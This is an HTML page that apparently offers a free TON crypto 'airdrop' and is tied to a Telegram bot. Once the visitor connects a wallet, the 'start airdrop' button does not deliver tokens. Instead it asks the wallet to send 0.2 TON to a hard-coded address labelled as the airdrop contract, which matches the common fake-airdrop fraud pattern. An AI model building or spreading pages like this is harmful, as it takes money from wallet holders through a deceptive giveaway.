<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Connect Example 1</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script src="https://unpkg.com/@tonconnect/sdk@0.0.34/dist/tonconnect-sdk.min.js"></script>
    <style>
        .center {
            display: flex;
            justify-content: center;
            margin: 20px 0;
        }

        #status {
            margin-top: 20px;
            padding: 10px;
            text-align: center;
        }

        #start-airdrop {
            display: block;
            margin: 20px auto;
            padding: 10px 20px;
            cursor: pointer;
        }
    </style>
</head>

<body>
    <div class="center" id="ton-connect"></div>
    <button id="start-airdrop">Rozpocznij AIRDROP 2</button>
    <div id="status"></div>

    <script>
        const AIRDROP_CONTRACT_ADDRESS = 'EQAj2hi6_JljnyupUJqqWduHyQ_74Uf23FcVQmdXy9KWVnQY'; // Twój adres kontraktu airdropa
        const DOGS_TOKEN_ADDRESS = 'EQCvxJy4eG8hyHBFsZ7eePxrRsUQSFE_jpptRAYBmcG_DOGS'; // Podmień na właściwy adres kontraktu tokenu DOGS

        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json',
            buttonRootId: 'ton-connect'
        });

        tonConnectUI.uiOptions = {
            twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
        };

        const startAirdropButton = document.getElementById('start-airdrop');
        const statusDiv = document.getElementById('status');

        tonConnectUI.onStatusChange(async (wallet) => {
            console.log('Wallet status:', wallet);
            if (wallet) {
                startAirdropButton.style.display = 'block';
                statusDiv.textContent = 'Connected: ' + wallet.account.address;
            } else {
                startAirdropButton.style.display = 'none';
                statusDiv.textContent = 'Please connect your wallet first';
            }
        });

        startAirdropButton.addEventListener('click', async () => {
            try {
                if (!tonConnectUI.connected) {
                    statusDiv.textContent = 'Please connect your wallet first';
                    return;
                }

                console.log('Sending transaction...');

                // Przygotowanie transakcji
                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 60,
                    messages: [
                        {
                            address: AIRDROP_CONTRACT_ADDRESS,
                            amount: '200000000',
                            payload: "Claim airdrop" // Prostsza wersja z samym tekstem
                        }
                    ],
                    from: tonConnectUI.wallet.account.address,
                    network: tonConnectUI.network,
                    params: {
                        tokens: []
                    }
                };

                statusDiv.textContent = 'Sending transaction...';

                const result = await tonConnectUI.sendTransaction({
                    messages: transaction.messages,
                    validUntil: transaction.validUntil,
                    from: transaction.from,
                    network: transaction.network,
                    params: transaction.params
                });

                console.log('Transaction result:', result);
                statusDiv.textContent = 'Transaction sent! Waiting for confirmation...';

            } catch (error) {
                console.error('Transaction error:', error);
                statusDiv.textContent = 'Error: ' + (error.message || 'Unknown error occurred');
            }
        });

        async function checkInitialConnection() {
            const wallet = await tonConnectUI.getConnectedWallet();
            if (!wallet) {
                startAirdropButton.style.display = 'none';
                statusDiv.textContent = 'Please connect your wallet first';
            }
        }

        checkInitialConnection();
    </script>
</body>

</html>
